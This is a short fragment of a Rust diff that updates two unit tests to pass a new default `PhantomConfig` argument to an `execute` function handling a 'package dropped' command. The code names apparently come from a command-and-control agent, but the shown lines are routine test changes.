         let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 99, payload);
 
-        execute(&package, &mut state).await.expect("execute");
+        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
 
         assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
 
@@ -5962,7 +6112,7 @@ mod tests {
         let package = DemonPackage::new(DemonCommand::CommandPackageDropped, 1, payload);
         let mut state = PhantomState::default();
 
-        let result = execute(&package, &mut state).await;
+        let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
         assert!(result.is_err());
     }
 }
